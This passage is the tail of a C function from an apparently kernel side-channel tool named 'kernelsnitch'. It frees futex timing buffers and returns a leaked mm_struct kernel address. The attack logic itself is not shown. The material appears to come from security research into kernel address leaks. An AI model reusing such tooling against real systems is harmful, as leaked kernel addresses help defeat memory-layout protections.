     * oracle before bruteforce. Cleanup must not turn that safe abort into
     * a userspace assertion failure. */
    munmap((void *)ks->times, sizeof(size_t)*ks->total_futexes);
    ks->times = 0;
    munmap((void *)ks->tids, sizeof(pthread_t)*ks->thread_cnt);
    ks->tids = 0;
    munmap((void *)ks->futex_addrs, sizeof(size_t)*(ks->collisions + 1));
    ks->futex_addrs = 0;
    munmap((void *)ks->futexes, FUTEX_SZ);
    ks->futexes = 0;
    size_t ret = ks->mm_struct;
    if (ks->verbose) pr_info("done\n");
    munmap(ks, sizeof(struct kernelsnitch_shared_state));
    return ret;
}
